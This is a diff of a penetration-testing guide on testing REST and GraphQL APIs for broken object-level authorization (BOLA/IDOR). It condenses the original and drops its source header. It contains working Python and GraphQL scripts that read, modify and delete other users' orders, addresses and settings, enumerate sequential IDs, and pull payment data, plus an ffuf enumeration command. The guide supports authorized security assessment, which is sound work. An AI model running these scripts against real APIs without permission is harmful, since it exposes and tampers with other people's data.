@@ -1,19 +1,6 @@
-<!--
-Source: https://github.com/mukul975/Anthropic-Cybersecurity-Skills
-Author: mahipal
-License: Apache 2.0 (Copyright 2026 mukul975)
-Copied verbatim for local supply-chain safety. No modifications.
--->
 ---
 name: testing-api-for-broken-object-level-authorization
-description: 'Tests REST and GraphQL APIs for Broken Object Level Authorization (BOLA/IDOR) vulnerabilities where an authenticated
-  user can access or modify resources belonging to other users by manipulating object identifiers in API requests. The tester
-  intercepts API calls, identifies object ID parameters (numeric IDs, UUIDs, slugs), and systematically replaces them with
-  IDs belonging to other users to determine if the server enforces per-object authorization. This is OWASP API Security Top
-  10 2023 risk API1. Activates for requests involving BOLA testing, IDOR in APIs, object-level authorization testing, or API
-  access control bypass.
-
-  '
+description: Tests REST and GraphQL APIs for BOLA/IDOR — where authenticated users access or modify resources belonging to other users by manipulating object identifiers. Covers OWASP API1:2023 across all HTTP methods, ID formats, batch endpoints, and GraphQL.
 domain: cybersecurity
 subdomain: api-security
 tags:
@@ -22,286 +9,177 @@ tags:
 - bola
 - idor
 - authorization
-- rest-security
 version: 1.0.0
-author: mahipal
-license: Apache-2.0
-nist_csf:
-- PR.PS-01
-- ID.RA-01
-- PR.DS-10
-- DE.CM-01
 ---
 # Testing API for Broken Object Level Authorization
 
 ## When to Use
 
-- Assessing REST or GraphQL APIs that use object identifiers in URL paths, query parameters, or request bodies
-- Performing OWASP API Security Top 10 assessments where API1:2023 (BOLA) must be tested
-- Testing multi-tenant SaaS applications where users from different tenants should not access each other's data
-- Validating that API endpoints enforce per-object authorization checks beyond just authentication
-- Evaluating APIs after new endpoints are added to ensure authorization middleware is applied consistently
+- Assessing REST or GraphQL APIs that use object identifiers in URL paths, query params, or request bodies
+- Performing OWASP API Top 10 assessments targeting API1:2023 (BOLA)
+- Testing multi-tenant SaaS applications for cross-tenant data leakage
+- Validating per-object authorization enforcement beyond authentication
+- Regression-checking authorization after adding new endpoints
 
-**Do not use** without written authorization from the API owner. BOLA testing involves accessing or attempting to access other users' data, which requires explicit permission.
+**Do not use** without written authorization. BOLA testing requires accessing or attempting to access other users' data.
 
 ## Prerequisites
 
-- Written authorization specifying the target API endpoints and scope of testing
-- At least two test accounts with different privilege levels and distinct data sets
-- Burp Suite Professional or OWASP ZAP configured as an intercepting proxy
-- Authentication tokens (JWT, session cookies, API keys) for each test account
-- API documentation (OpenAPI/Swagger spec) or access to enumerate endpoints
-- Python 3.10+ with `requests` library for scripted testing
-- Autorize Burp extension installed for automated BOLA detection
+- Written authorization covering target endpoints and scope
+- At least two test accounts with separate data sets (different user IDs and owned objects)
+- Burp Suite Professional + Autorize extension
+- Authentication tokens for each account (JWT, cookies, or API keys)
+- OpenAPI/Swagger spec, or Burp sitemap from proxying the application
+- Python 3.10+ with `requests`
 
 ## Workflow
 
-### Step 1: API Endpoint Discovery and Object ID Mapping
+### Step 1: Map All Object-Bearing Endpoints
 
-Enumerate all API endpoints and identify parameters that reference objects:
-
-**From OpenAPI/Swagger Specification:**
 ```bash
-# Download and parse the OpenAPI spec
-curl -s https://target-api.example.com/api/docs/swagger.json | python3 -m json.tool
-
-# Extract all endpoints with path parameters
-curl -s https://target-api.example.com/api/docs/swagger.json | \
-  python3 -c "
+# Extract path-parameterized endpoints from OpenAPI spec
+curl -s https://target-api.example.com/api/docs/swagger.json | python3 -c "
 import json, sys
 spec = json.load(sys.stdin)
 for path, methods in spec.get('paths', {}).items():
-    for method, details in methods.items():
-        if method in ('get','post','put','patch','delete'):
-            params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
+    for method in ('get','post','put','patch','delete'):
+        if method in methods:
+            params = [p['name'] for p in methods[method].get('parameters',[])
+                      if p.get('in') in ('path','query')]
             if params:
-                print(f'{method.upper()} {path} -> params: {params}')
+                print(f'{method.upper():6} {path}  params={params}')
 "
 ```
 
-**From Burp Suite Traffic:**
-1. Browse the application as User A, exercising all features that involve data creation and retrieval
-2. In Burp, go to Target > Site Map and filter for API paths (e.g., `/api/v1/`, `/graphql`)
-3. Look for patterns: `/api/v1/users/{id}`, `/api/v1/orders/{order_id}`, `/api/v1/documents/{doc_uuid}`
-4. Note the object ID format: sequential integers (predictable), UUIDs (less predictable), or encoded values
-
-**Classify Object ID Types:**
+**ID type risk classification:**
 
 | ID Type | Example | Predictability | BOLA Risk |
 |---------|---------|---------------|-----------|
-| Sequential Integer | `/orders/1042` | High - increment/decrement | Critical |
-| UUID v4 | `/orders/550e8400-e29b-41d4-a716-446655440000` | Low - random | Medium (if leaked) |
-| Encoded/Hashed | `/orders/base64encodedvalue` | Medium - decode and predict | High |
-| Composite | `/users/42/orders/1042` | High - multiple IDs to swap | Critical |
-| Slug | `/profiles/john-doe` | Medium - guess usernames | High |
+| Sequential integer | `/orders/1042` | High — enumerate by ±1 | Critical |
+| UUID v4 | `/orders/550e8400-…` | Low — random | Medium (if leaked in responses) |
+| Base64 / encoded | `/orders/NTAwMw==` | High — decode + predict | High |
+| Composite | `/users/42/orders/1042` | High — swap either part | Critical |
+| Slug | `/profiles/john-doe` | Medium — guess usernames | High |
 
-### Step 2: Baseline Request Capture with Authenticated User
-
-Capture legitimate requests for User A and User B:
+### Step 2: Establish Baseline for Both Accounts
 
 ```python
 import requests
 
 BASE_URL = "https://target-api.example.com/api/v1"
+hdrs_a = {"Authorization": "Bearer <user_a_token>", "Content-Type": "application/json"}
+hdrs_b = {"Authorization": "Bearer <user_b_token>", "Content-Type": "application/json"}
 
-# User A credentials
-user_a_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
-user_a_headers = {"Authorization": user_a_token, "Content-Type": "application/json"}
+# Get each user's own data
+user_a_id = requests.get(f"{BASE_URL}/users/me", headers=hdrs_a).json()["id"]
+user_b_id = requests.get(f"{BASE_URL}/users/me", headers=hdrs_b).json()["id"]
 
-# User B credentials
-user_b_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
-user_b_headers = {"Authorization": user_b_token, "Content-Type": "application/json"}
+orders_a = [o["id"] for o in requests.get(f"{BASE_URL}/users/{user_a_id}/orders", headers=hdrs_a).json()["orders"]]
+orders_b = [o["id"] for o in requests.get(f"{BASE_URL}/users/{user_b_id}/orders", headers=hdrs_b).json()["orders"]]
 
-# Step 1: Identify User A's objects
-user_a_profile = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers)
-user_a_id = user_a_profile.json()["id"]  # e.g., 1001
-
-user_a_orders = requests.get(f"{BASE_URL}/users/{user_a_id}/orders", headers=user_a_headers)
-user_a_order_ids = [o["id"] for o in user_a_orders.json()["orders"]]  # e.g., [5001, 5002]
-
-# Step 2: Identify User B's objects
-user_b_profile = requests.get(f"{BASE_URL}/users/me", headers=user_b_headers)
-user_b_id = user_b_profile.json()["id"]  # e.g., 1002
-
-user_b_orders = requests.get(f"{BASE_URL}/users/{user_b_id}/orders", headers=user_b_headers)
-user_b_order_ids = [o["id"] for o in user_b_orders.json()["orders"]]  # e.g., [5003, 5004]
-
-print(f"User A (ID: {user_a_id}): Orders {user_a_order_ids}")
-print(f"User B (ID: {user_b_id}): Orders {user_b_order_ids}")
+print(f"User A ({user_a_id}): owns orders {orders_a}")
+print(f"User B ({user_b_id}): owns orders {orders_b}")
 ```
 
-### Step 3: BOLA Testing - Horizontal Privilege Escalation
-
-Attempt to access User B's objects using User A's authentication:
+### Step 3: Core BOLA Tests — Read, Write, Delete
 
 ```python
-import json
-
 results = []
 
-# Test 1: Access User B's profile with User A's token
-resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
-results.append({
-    "test": "Access other user profile",
-    "endpoint": f"GET /users/{user_b_id}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code == 200,
-    "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
-})
+def check(label, endpoint, method="GET", json_body=None):
+    r = requests.request(method, f"{BASE_URL}{endpoint}", headers=hdrs_a, json=json_body)
+    vuln = r.status_code not in (401, 403, 404)
+    results.append({"test": label, "status": r.status_code, "vulnerable": vuln})
+    print(f"[{'VULN' if vuln else 'OK':4}] {method} {endpoint} -> {r.status_code}")
+    return r
 
-# Test 2: Access User B's orders with User A's token
-for order_id in user_b_order_ids:
-    resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
-    results.append({
-        "test": f"Access other user order {order_id}",
-        "endpoint": f"GET /orders/{order_id}",
-        "auth": "User A",
-        "status": resp.status_code,
-        "vulnerable": resp.status_code == 200
-    })
+# Read another user's objects
+check("Read other user profile",    f"/users/{user_b_id}")
+check("Read other user order",      f"/orders/{orders_b[0]}")
+check("Read other user invoice",    f"/users/{user_b_id}/orders/{orders_b[0]}/invoice")
 
-# Test 3: Modify User B's order with User A's token
-resp = requests.patch(
-    f"{BASE_URL}/orders/{user_b_order_ids[0]}",
-    headers=user_a_headers,
-    json={"status": "cancelled"}
-)
-results.append({
-    "test": "Modify other user order",
-    "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code in (200, 204)
-})
+# Write / modify another user's objects
+check("Modify other user order",    f"/orders/{orders_b[0]}", "PATCH", {"status": "cancelled"})
+check("Modify other user address",  f"/users/{user_b_id}/address", "PUT",
+      {"street": "1 Attacker Ln", "city": "Hacktown"})
 
-# Test 4: Delete User B's resource with User A's token
-resp = requests.delete(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers)
-results.append({
-    "test": "Delete other user order",
-    "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code in (200, 204)
-})
-
-# Print results
-for r in results:
-    status = "VULNERABLE" if r["vulnerable"] else "SECURE"
-    print(f"[{status}] {r['test']}: {r['endpoint']} -> HTTP {r['status']}")
+# Delete another user's object
+check("Delete other user order",    f"/orders/{orders_b[0]}", "DELETE")
 ```
 
-### Step 4: Advanced BOLA Techniques
-
-Test for less obvious BOLA patterns:
+### Step 4: Advanced BOLA Patterns
 
 ```python
-# Technique 1: Parameter pollution - send both IDs
-resp = requests.get(
-    f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
-    headers=user_a_headers
-)
-print(f"Parameter pollution: {resp.status_code}")
+# Pattern 1 — Parameter pollution (two IDs in same request)
+r = requests.get(f"{BASE_URL}/orders/{orders_a[0]}?order_id={orders_b[0]}", headers=hdrs_a)
+print(f"Parameter pollution: {r.status_code}")
 
-# Technique 2: JSON body object ID override
-resp = requests.post(
-    f"{BASE_URL}/orders/details",
-    headers=user_a_headers,
-    json={"order_id": user_b_order_ids[0]}
-)
-print(f"Body ID override: {resp.status_code}")
+# Pattern 2 — Batch / bulk endpoint includes foreign IDs
+r = requests.post(f"{BASE_URL}/orders/batch", headers=hdrs_a,
+    json={"order_ids": orders_a + orders_b})
+returned = len(r.json().get("orders", []))
+print(f"Batch inclusion: {r.status_code}, returned {returned} orders (expected ≤{len(orders_a)})")
 
-# Technique 3: Array of IDs - include other user's IDs in batch request
-resp = requests.post(
-    f"{BASE_URL}/orders/batch",
-    headers=user_a_headers,
-    json={"order_ids": user_a_order_ids + user_b_order_ids}
-)
-print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders',[]))} orders")
-
-# Technique 4: Numeric ID manipulation for sequential IDs
+# Pattern 3 — Sequential ID enumeration (±5 from own IDs)
 for offset in range(-5, 6):
-    test_id = user_a_order_ids[0] + offset
-    if test_id not in user_a_order_ids:
-        resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
-        if resp.status_code == 200:
-            owner = resp.json().get("user_id", "unknown")
-            if str(owner) != str(user_a_id):
-                print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")
+    test_id = orders_a[0] + offset
+    if test_id in orders_a:
+        continue
+    r = requests.get(f"{BASE_URL}/orders/{test_id}", headers=hdrs_a)
+    if r.status_code == 200:
+        owner = r.json().get("user_id", "?")
+        if str(owner) != str(user_a_id):
+            print(f"[BOLA] Order {test_id} owned by {owner}, accessible via User A")
 
-# Technique 5: Swap object ID in nested resource paths
-resp = requests.get(
-    f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
-    headers=user_a_headers
-)
-print(f"Nested resource BOLA: {resp.status_code}")
+# Pattern 4 — HTTP method switching (if GET is blocked, try PUT)
+for method in ['GET','PUT','PATCH','DELETE','HEAD']:
+    r = requests.request(method, f"{BASE_URL}/users/{user_b_id}/settings",
+        headers=hdrs_a, json={"notifications": False})
+    if r.status_code not in (401, 403, 404, 405):
+        print(f"[BOLA] Method {method} on other user settings: {r.status_code}")
 
-# Technique 6: Method switching - GET may be blocked but PUT allowed
-for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
-    resp = requests.request(
-        method,
-        f"{BASE_URL}/users/{user_b_id}/settings",
-        headers=user_a_headers,
-        json={"notifications": False} if method in ('PUT', 'PATCH') else None
-    )
-    if resp.status_code not in (401, 403, 405):
-        print(f"Method {method} on other user settings: {resp.status_code}")
+# Pattern 5 — JSON body ID override
+r = requests.post(f"{BASE_URL}/orders/details", headers=hdrs_a,
+    json={"order_id": orders_b[0]})
+print(f"Body ID override: {r.status_code}")
 ```
 
-### Step 5: Automated BOLA Detection with Autorize (Burp Suite)
+### Step 5: Automated Detection with Burp Autorize
 
-Configure Autorize for automated detection:
+1. Install **Autorize** from the Burp BApp Store
+2. Paste User B's `Authorization` header into the Autorize tab
+3. Set interception filters — include: `.*\/api\/.*` ; exclude: `.*\.(js|css|png)$`
+4. Set enforcement detector: flag as "bypassed" if User A gets HTTP 200 on User B's resources
+5. Browse the app as User A — Autorize replays every request with User B's token automatically
+6. Review results table:
+   - **Green** = authorization enforced
+   - **Red** = authorization bypassed (BOLA)
+   - **Orange** = manual review needed
 
-1. Install Autorize from the BApp Store in Burp Suite Professional
-2. In the Autorize tab, paste User B's authentication cookie or header
-3. Configure the interception filters:
-   - Include: `.*\/api\/.*` (only API paths)
-   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
-4. Set the enforcement detector:
-   - Add conditions where response length or status code differs between User A and User B
-   - Mark as "enforced" if User A gets 403/401 for User B's resources
-   - Mark as "bypassed" if User A gets 200 with User B's data
-5. Browse the application as User A; Autorize automatically replays each request with User B's token
-6. Review the Autorize results table:
-   - Green = Authorization enforced (secure)
-   - Red = Authorization bypassed (BOLA vulnerability)
-   - Orange = Needs manual review (ambiguous response)
-
-### Step 6: GraphQL BOLA Testing
+### Step 6: GraphQL BOLA
 
 ```graphql
-# Test BOLA in GraphQL queries using node/ID relay pattern
-# User A queries User B's order by global relay ID
+# Relay node ID — Base64("Order:5003") = User B's order
 query {
-  node(id: "T3JkZXI6NTAwMw==") {  # Base64 of "Order:5003" (User B's)
+  node(id: "T3JkZXI6NTAwMw==") {
     ... on Order {
       id
       totalAmount
-      shippingAddress {
-        street
-        city
-      }
-      items {
-        productName
-        quantity
-      }
+      shippingAddress { street city }
+      items { productName quantity }
     }
   }
 }
 
-# Test nested object access through relationships
+# Nested relationship traversal — access User B's payment data
 query {
-  user(id: "1002") {  # User B's ID
+  user(id: "1002") {
     email
-    phoneNumber
     orders {
       edges {
         node {
-          id
           totalAmount
-          paymentMethod {
-            lastFourDigits
-          }
+          paymentMethod { lastFourDigits }
         }
       }
     }
@@ -313,80 +191,43 @@ query {
 
 | Term | Definition |
 |------|------------|
-| **BOLA** | Broken Object Level Authorization (OWASP API1:2023) - the API does not verify that the authenticated user has permission to access the specific object referenced by the request |
-| **IDOR** | Insecure Direct Object Reference - a closely related term where the application uses user-controllable input to directly access objects without authorization checks |
-| **Horizontal Privilege Escalation** | Accessing resources belonging to another user at the same privilege level by manipulating object identifiers |
-| **Vertical Privilege Escalation** | Accessing resources or functions restricted to a higher privilege level (e.g., regular user accessing admin endpoints) |
-| **Object ID Enumeration** | Predicting valid object identifiers by analyzing their format (sequential integers, UUID patterns, encoded values) |
-| **Autorize** | A Burp Suite extension that automates authorization testing by replaying requests with different user tokens |
+| **BOLA** | Broken Object Level Authorization (OWASP API1:2023) — server authenticates user but does not verify they own the requested object |
+| **IDOR** | Insecure Direct Object Reference — user-controlled input accesses objects directly without authorization check |
+| **Horizontal escalation** | Accessing another user's resources at the same privilege level |
+| **Vertical escalation** | Reaching resources or operations restricted to a higher privilege level |
+| **Autorize** | Burp Suite extension automating BOLA detection by replaying requests with alternate user tokens |
 
-## Tools & Systems
+## Tools
 
-- **Burp Suite Professional**: Intercepting proxy for capturing and manipulating API requests with Autorize extension for automated BOLA testing
-- **OWASP ZAP**: Open-source alternative with Access Control Testing add-on for authorization boundary testing
-- **Autorize**: Burp extension that automatically detects authorization enforcement by replaying requests with different user contexts
-- **Postman**: API testing platform for crafting and replaying requests with different authentication tokens across collections
-- **ffuf**: Web fuzzer that can enumerate object IDs at scale: `ffuf -u https://api.example.com/orders/FUZZ -w ids.txt -H "Authorization: Bearer token"`
-
-## Common Scenarios
-
-### Scenario: E-Commerce API BOLA Assessment
-
-**Context**: An e-commerce platform exposes a REST API for its mobile app. The API uses sequential integer IDs for orders, users, and addresses. Two test accounts are provided: a regular customer (User A, ID 1001) and another customer (User B, ID 1002).
-
-**Approach**:
-1. Map all endpoints from the Swagger spec at `/api/docs`: identify 47 endpoints, 23 of which take object IDs
-2. Capture User A's requests for their own resources: profile, orders, addresses, payment methods, wishlist
-3. Replace User A's object IDs with User B's IDs systematically across all 23 endpoints
-4. Find that `GET /api/v1/orders/{id}` returns any order regardless of ownership (BOLA on read)
-5. Find that `PATCH /api/v1/addresses/{id}` allows modifying any user's address (BOLA on write)
-6. Find that `GET /api/v1/users/{id}/payment-methods` leaks payment card last-four digits for any user
-7. Test batch endpoint `POST /api/v1/orders/export` - accepts array of order IDs and exports all without ownership check
-8. Verify that `DELETE /api/v1/orders/{id}` correctly returns 403 for non-owned orders (authorization enforced)
-
-**Pitfalls**:
-- Only testing GET requests and missing BOLA in PUT/PATCH/DELETE methods that allow data modification or destruction
-- Assuming UUIDs prevent BOLA - UUIDs are less predictable but can be leaked in API responses, logs, or URL parameters
-- Not testing nested resource paths where authorization may be checked on the parent but not the child resource
-- Missing BOLA in bulk/batch endpoints that accept arrays of object IDs
-- Not considering that different API versions (v1 vs v2) may have different authorization implementations
+- **Burp Suite Professional** — proxy and Autorize extension for automated multi-user replay
+- **OWASP ZAP** — open-source alternative with Access Control Testing add-on
+- **Postman** — manual multi-token request replay across collections
+- **ffuf** — enumerate object IDs at scale: `ffuf -u https://api/orders/FUZZ -w ids.txt -H "Authorization: Bearer ..."`
 
 ## Output Format
 
 ```
-## Finding: Broken Object Level Authorization in Order API
+## Finding: BOLA — Order and Address APIs
 
-**ID**: API-BOLA-001
-**Severity**: High (CVSS 7.5)
-**OWASP API**: API1:2023 - Broken Object Level Authorization
+**ID**: API-BOLA-001  |  Severity: High (CVSS 7.5)
+**OWASP API**: API1:2023 — Broken Object Level Authorization
+
 **Affected Endpoints**:
-  - GET /api/v1/orders/{id}
-  - PATCH /api/v1/addresses/{id}
-  - GET /api/v1/users/{id}/payment-methods
-  - POST /api/v1/orders/export
-
-**Description**:
-The API does not enforce object-level authorization on order retrieval,
-address modification, payment method viewing, or order export endpoints.
-An authenticated user can access or modify any other user's resources by
-substituting object IDs in the request. Sequential integer IDs make
-enumeration trivial.
+  GET  /api/v1/orders/{id}
+  PATCH /api/v1/addresses/{id}
+  GET  /api/v1/users/{id}/payment-methods
+  POST /api/v1/orders/batch
 
 **Proof of Concept**:
-1. Authenticate as User A (ID 1001): POST /api/v1/auth/login
-2. Retrieve User A's order: GET /api/v1/orders/5001 -> 200 OK (legitimate)
-3. Access User B's order: GET /api/v1/orders/5003 -> 200 OK (BOLA - returns full order details)
-4. Modify User B's address: PATCH /api/v1/addresses/2002 -> 200 OK (BOLA - address changed)
+1. Authenticate as User A (ID 1001)
+2. GET /api/v1/orders/5003  →  200 OK (User B's order returned in full)
+3. PATCH /api/v1/addresses/2002  →  200 OK (User B's address modified)
 
-**Impact**:
-- Read access to all 850,000+ customer orders including shipping addresses and order contents
-- Write access to any customer's delivery address, enabling package redirection
-- Exposure of partial payment card data for all customers
+**Impact**: Read access to all customer orders; write access to any delivery
+address; partial payment card exposure.
 
 **Remediation**:
-1. Implement object-level authorization middleware that verifies the authenticated user owns the requested resource
-2. Use authorization checks at the data access layer: `WHERE order.user_id = authenticated_user.id`
-3. Replace sequential integer IDs with UUIDs to reduce predictability (defense in depth, not a fix alone)
-4. Add authorization tests to the CI/CD pipeline for every endpoint that accepts object IDs
-5. Implement rate limiting per user to slow enumeration attempts
+1. Add ownership check at data-access layer: WHERE order.user_id = auth_user.id
+2. Apply the same check to every HTTP method and every nested resource path
+3. Add authorization assertions to CI/CD for every endpoint accepting object IDs
 ```
